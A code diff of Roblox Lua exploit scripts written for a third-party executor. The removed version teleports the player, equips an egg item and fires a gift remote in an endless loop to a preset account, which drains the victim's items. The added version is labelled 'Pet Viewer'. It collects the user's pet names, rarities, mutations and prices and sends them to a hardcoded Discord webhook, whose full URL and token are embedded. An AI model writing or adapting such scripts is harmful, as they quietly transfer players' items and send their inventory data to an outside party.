@@ -1,197 +1,147 @@
-repeat task.wait() until game:IsLoaded()
+--=== CONFIG ===--
+local webhookUrl = "https://discord.com/api/webhooks/1378811253765574767/t5lFqOqiM641yFiPN6_GJpiTlzzY3m2UIMIH7g9Jye_lfZUIyXkPQum5IiwPmRWbp7pe"
 
+--=== SUPPORT ===--
+function findMyPlot(debug)
+    for _, plot in pairs(workspace.Plots:GetChildren()) do
+        local owner = plot:FindFirstChild("Owner")
+        if owner and owner.Value == game.Players.LocalPlayer then
+            if debug then print("Found plot: "..plot.Name) end
+            return plot
+        end
+    end
+    return nil
+end
+
+function getPetDataFromSpawn(spawn)
+    if not spawn then return nil end
+    local petModel = spawn:FindFirstChildOfClass("Model")
+    if not petModel then return nil end
+
+    local name = petModel.Name
+    local mut = petModel:FindFirstChild("Mutation") and petModel.Mutation.Value or "Normal"
+    local rar = petModel:FindFirstChild("Rarity") and petModel.Rarity.Value or "Common"
+    local price = petModel:FindFirstChild("Price") and petModel.Price.Value or 0
+
+    return {
+        name = name,
+        mut = mut,
+        rar = rar,
+        price = price
+    }
+end
+
+function sendWebhook(content)
+    local HttpService = game:GetService("HttpService")
+    local data = {
+        ["content"] = content
+    }
+    local jsonData = HttpService:JSONEncode(data)
+
+    syn.request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+end
+
+function listPetsInPlot()
+    local plot = findMyPlot(true)
+    if not plot then
+        warn("Plot not found!")
+        return
+    end
+
+    local podFolder = plot:FindFirstChild("AnimalPodiums")
+    if not podFolder then
+        warn("No AnimalPodiums folder in plot")
+        return
+    end
+
+    local finalLog = "=== Pets in Your Plot ===\n"
+
+    for _, podium in ipairs(podFolder:GetChildren()) do
+        local basePart = podium:FindFirstChild("Base")
+        local spawn = basePart and basePart:FindFirstChild("Spawn")
+        local data = getPetDataFromSpawn(spawn)
+        if data then
+            local line = string.format(
+                ":feet: Name: %s | Mutation: %s | Rarity: %s | Price: $%s",
+                data.name,
+                data.mut,
+                data.rar,
+                tostring(data.price)
+            )
+            print(line)
+            finalLog = finalLog .. line .. "\n"
+        else
+            local line = "[Slot " .. podium.Name .. "] Empty or invalid spawn"
+            print(line)
+            finalLog = finalLog .. line .. "\n"
+        end
+    end
+
+    sendWebhook(finalLog)
+end
+
+--=== SIMPLE CUSTOM GUI ===--
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TeleportService = game:GetService("TeleportService")
-
 local player = Players.LocalPlayer
-local targetPlaceId = game.PlaceId
-local targetJobId = getgenv().jobId or "5f4b7a59-4ee2-4a69-b628-b1335659f50b"
-local blockedName = getgenv().BlockedPlayerName
+local PlayerGui = player:WaitForChild("PlayerGui")
 
--- ❌ Chặn người dùng
-if player.Name == blockedName then
-    print("User " .. blockedName .. " nên không chạy script này.")
-    return
-end
+-- Tạo ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MyCustomPetGUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
 
--- 🕓 Đợi leaderstats
-local function waitForLeaderstats(timeout)
-    local t = 0
-    while t < timeout do
-        if player:FindFirstChild("leaderstats") then return true end
-        task.wait(1)
-        t += 1
-    end
-    return false
-end
+-- Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 120)
+frame.Position = UDim2.new(0.5, -100, 0.5, -60)
+frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
 
--- Đợi leaderstats + 5 giây
-if waitForLeaderstats(5) then
-    print("leaderstats đã sẵn sàng. Chờ thêm 5 giây...")
-    task.wait(5)
-else
-    warn("Không tìm thấy leaderstats sau 5 giây.")
-    return
-end
+-- Tiêu đề
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,30)
+title.BackgroundTransparency = 1
+title.Text = "Pet Viewer"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+title.Parent = frame
 
--- ⚙️ Thiết lập vị trí teleport
-local teleportPosition = Vector3.new(-15361.3496093750, 16.7299995422, -3889.5200195312)
-local precision = 5
+-- Button Scan
+local scanButton = Instance.new("TextButton")
+scanButton.Size = UDim2.new(1, -20, 0, 35)
+scanButton.Position = UDim2.new(0,10,0,40)
+scanButton.Text = "📝 Quét Pet + Gửi"
+scanButton.TextColor3 = Color3.fromRGB(255,255,255)
+scanButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+scanButton.Font = Enum.Font.SourceSans
+scanButton.TextSize = 18
+scanButton.Parent = frame
 
-local function isInPosition(pos1, pos2, tolerance)
-    return (pos1 - pos2).Magnitude <= tolerance
-end
-
-local function teleportToPosition()
-    local character = player.Character or player.CharacterAdded:Wait()
-    local hrp = character:WaitForChild("HumanoidRootPart")
-    hrp.CFrame = CFrame.new(teleportPosition)
-end
-
--- 📦 Hold item logic
-local InventoryCmds = require(ReplicatedStorage.Library.Client.InventoryCmds)
-local FarmHoldCmds = require(ReplicatedStorage.Library.Client.FarmHoldCmds)
-
-local function holdItemByName(name)
-    local container = InventoryCmds.Container()
-    if not container then
-        warn("Không tìm thấy container inventory.")
-        return
-    end
-
-    for _, item in pairs(container:All()) do
-        if item:GetName() == name then
-            FarmHoldCmds.Hold(item)
-            print("Đã cầm vật phẩm: " .. name)
-            return
-        end
-    end
-
-    warn("Không tìm thấy vật phẩm với tên: " .. name)
-end
-
--- 🌟 GUI
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "FarmingGUI"
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-local mainFrame = Instance.new("Frame", gui)
-mainFrame.Size = UDim2.new(0, 250, 0, 200)
-mainFrame.Position = UDim2.new(0, 30, 0, 120)
-mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-mainFrame.BorderSizePixel = 0
-mainFrame.BackgroundTransparency = 0.05
-Instance.new("UICorner", mainFrame)
-
--- Đổ bóng
-local shadow = Instance.new("ImageLabel", mainFrame)
-shadow.Size = UDim2.new(1, 30, 1, 30)
-shadow.Position = UDim2.new(0, -15, 0, -15)
-shadow.BackgroundTransparency = 1
-shadow.Image = "rbxassetid://1316045217"
-shadow.ImageTransparency = 0.6
-shadow.ScaleType = Enum.ScaleType.Slice
-shadow.SliceCenter = Rect.new(10, 10, 118, 118)
-shadow.ZIndex = -1
-
--- 🔘 Nút bật script
-local toggleButton = Instance.new("TextButton", mainFrame)
-toggleButton.Size = UDim2.new(1, -30, 0, 45)
-toggleButton.Position = UDim2.new(0, 15, 0, 20)
-toggleButton.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
-toggleButton.Text = "🔄 Bật Script"
-toggleButton.Font = Enum.Font.GothamBold
-toggleButton.TextSize = 20
-toggleButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", toggleButton)
-
--- 🔘 Nút join JobId
-local joinJobButton = Instance.new("TextButton", mainFrame)
-joinJobButton.Size = UDim2.new(1, -30, 0, 45)
-joinJobButton.Position = UDim2.new(0, 15, 0, 80)
-joinJobButton.BackgroundColor3 = Color3.fromRGB(155, 89, 182)
-joinJobButton.Text = "🌐 Join Server theo JobId"
-joinJobButton.Font = Enum.Font.GothamBold
-joinJobButton.TextSize = 20
-joinJobButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", joinJobButton)
-
--- 🔘 Nút kick
-local kickButton = Instance.new("TextButton", mainFrame)
-kickButton.Size = UDim2.new(1, -30, 0, 45)
-kickButton.Position = UDim2.new(0, 15, 0, 140)
-kickButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-kickButton.Text = "🚪 Thoát Game"
-kickButton.Font = Enum.Font.GothamBold
-kickButton.TextSize = 20
-kickButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", kickButton)
-
--- 🎯 Sự kiện Nút Join
-joinJobButton.MouseButton1Click:Connect(function()
-    if targetJobId == "" then
-        warn("⚠️ Chưa có JobId. Đặt getgenv().jobId trước khi join.")
-        return
-    end
-    print("🔁 Đang chuyển đến server với JobId:", targetJobId)
-    TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, player)
+scanButton.MouseButton1Click:Connect(function()
+    listPetsInPlot()
 end)
 
--- 🎯 Sự kiện Nút Kick
-kickButton.MouseButton1Click:Connect(function()
-    player:Kick("Bạn đã chọn thoát game.")
-end)
+-- Button Đóng
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(1, -20, 0, 30)
+closeButton.Position = UDim2.new(0,10,0,80)
+closeButton.Text = "❌ Đóng GUI"
+closeButton.TextColor3 = Color3.fromRGB(255,255,255)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+closeButton.Font = Enum.Font.SourceSans
+closeButton.TextSize = 18
+closeButton.Parent = frame
 
--- 🎯 Sự kiện bật Script
-toggleButton.MouseButton1Click:Connect(function()
-    toggleButton.Text = "⏳ Đang chạy..."
-    toggleButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-    toggleButton.AutoButtonColor = false
-    toggleButton.Active = false
-
-    -- Teleport khi nhân vật spawn lại
-    player.CharacterAdded:Connect(function(character)
-        character:WaitForChild("HumanoidRootPart")
-        teleportToPosition()
-    end)
-
-    -- Nếu đã có nhân vật thì teleport ngay
-    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-        teleportToPosition()
-    end
-
-    -- Kiểm tra cho đến khi đứng đúng vị trí
-    while true do
-        local character = player.Character
-        if character and character:FindFirstChild("HumanoidRootPart") then
-            local hrp = character.HumanoidRootPart
-            if isInPosition(hrp.Position, teleportPosition, precision) then
-                print("✅ Đã đứng đúng vị trí!")
-                break
-            else
-                print("❌ Chưa đúng vị trí. Teleport lại...")
-                teleportToPosition()
-            end
-        end
-        task.wait(1)
-    end
-
-    -- Cầm vật phẩm cần thiết khi đã đứng đúng vị trí
-    holdItemByName("Pixel Angelus Egg")
-
-    -- Gửi quà
-    local targetPlayer = Players:FindFirstChild(blockedName)
-    if not targetPlayer then
-        warn("Không tìm thấy người chơi: " .. blockedName)
-        return
-    end
-
-    local farmingGiftEvent = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Farming Gift: Request Send")
-    local args = { targetPlayer }
-
-    while true do
-        farmingGiftEvent:FireServer(unpack(args))
-        task.wait(3)
-    end
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
 end)
